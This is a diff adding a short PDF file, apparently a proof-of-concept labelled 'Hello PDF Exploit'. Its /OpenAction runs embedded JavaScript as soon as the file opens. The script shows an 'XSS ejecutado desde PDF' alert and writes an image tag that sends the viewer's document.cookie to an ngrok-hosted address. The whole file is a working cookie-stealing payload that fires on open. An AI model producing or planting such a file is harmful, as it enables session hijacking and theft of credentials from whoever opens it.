@@ -1,0 +1,32 @@
+%PDF-1.7
+1 0 obj
+<< /Pages 2 0 R /Type /Catalog /OpenAction 3 0 R >>
+endobj
+2 0 obj
+<< /Count 1 /Kids [4 0 R] /Type /Pages >>
+endobj
+3 0 obj
+<< /S /JavaScript /JS (app.alert('XSS ejecutado desde PDF'); document.write('<img src="https://4386-87-219-120-9.ngrok-free.app/cookie?c='+document.cookie+'">');) >>
+endobj
+4 0 obj
+<< /Type /Page /Parent 2 0 R /Contents 5 0 R >>
+endobj
+5 0 obj
+<< /Length 44 >>
+stream
+BT /F1 12 Tf 100 700 Td (Hello PDF Exploit) Tj ET
+endstream
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000010 00000 n 
+0000000077 00000 n 
+0000000122 00000 n 
+0000000250 00000 n 
+0000000314 00000 n 
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+399
+%%EOF
